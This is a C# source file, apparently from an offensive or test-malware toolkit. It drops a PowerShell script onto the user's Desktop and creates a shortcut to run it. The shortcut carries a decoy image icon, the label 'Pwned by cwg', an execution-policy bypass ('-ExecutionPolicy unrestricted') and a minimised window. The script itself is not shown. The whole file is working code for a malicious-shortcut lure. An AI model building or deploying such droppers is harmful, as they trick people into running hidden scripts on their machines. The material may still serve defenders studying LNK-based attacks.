using System;
using System.IO;
using IWshRuntimeLibrary;
using System.Reflection;

namespace cwg.SourceLNK
{
    class Program
    {

        public static void CreateShortcut()
        {
            string ps1Path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, @"sourcePS.ps1");
            string iconPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, @"darkmatter.jpeg");
            string destPs1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), @"sourcePS.ps1");

            System.IO.File.Copy(ps1Path, destPs1, true);

            object shDesktop = (object)"Desktop";
            WshShell shell = new WshShell();
            string shortcutAddress = (string)shell.SpecialFolders.Item(ref shDesktop) + @"\sourceLNK.lnk";
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = "Pwned by cwg";
            shortcut.TargetPath = destPs1;
            shortcut.Arguments = "-NoProfile -ExecutionPolicy unrestricted";
            shortcut.IconLocation = iconPath;
            //Hides the window and activates another window.
            shortcut.WindowStyle = 7;
            shortcut.Save();
        }
        static void Main(string[] args)
        {
            CreateShortcut();
        }

    }
}
